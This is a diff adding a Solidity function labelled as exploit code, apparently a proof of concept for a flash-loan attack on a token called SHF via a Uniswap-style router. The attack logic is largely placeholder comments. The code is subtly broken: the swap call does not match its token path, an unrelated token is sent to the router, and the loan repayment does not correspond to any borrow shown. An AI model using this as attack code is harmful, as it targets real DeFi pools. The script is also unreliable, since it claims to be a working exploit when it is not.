@@ -1,0 +1,52 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Start prank to simulate a user account
+    vm.startPrank(address(this), address(this));
+
+    // Obtain WBNB to cover flash loan fees from the DPP
+    IWETH(wbnBAddress).deposit{value: amount}();
+    
+    // Getting the current reserves from the pair
+    (uint112 reserve0, uint112 reserve1,) = uniswapPair.getReserves();
+    
+    // Logic for exploit - Perform necessary swaps or transfers here
+    // Assuming I previously setup an allocation
+    valuableToken.transfer(address(uniswapRouter), amount);
+
+    // For instance, swap WBNB for SHF using Uniswap router
+    address[] memory path = new address[](2);
+    path[0] = address(wbnBAddress);
+    path[1] = address(target); // SHF
+
+    uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
+        amount,
+        0, // Accept any amount of SHF
+        path,
+        address(this),
+        block.timestamp
+    );
+
+    // Once acquired, proceed to execute any further operations required
+    // ...
+    
+    // Check final balance of WETH and ensure profit was gained
+    uint256 finalWethBalance = IWETH(wbnBAddress).balanceOf(address(this));
+    
+    // Capture profit calculation and ensure surplus
+    require(finalWethBalance > amount, "No profit made, aborting.");
+    
+    // Repay the flash loan
+    completeFlashLoanRepayment(amount);
+    
+    // Stop prank
+    vm.stopPrank();
+}
+
+// Assume there's a method to repay the flash loan after executing the rest of the exploit logic
+function completeFlashLoanRepayment(uint256 amount) internal {
+    // Transfer back the exact amount borrowed
+    valuableToken.transfer(address(flashloanProvider), amount);
+}
+</executeExploitCode>
+```
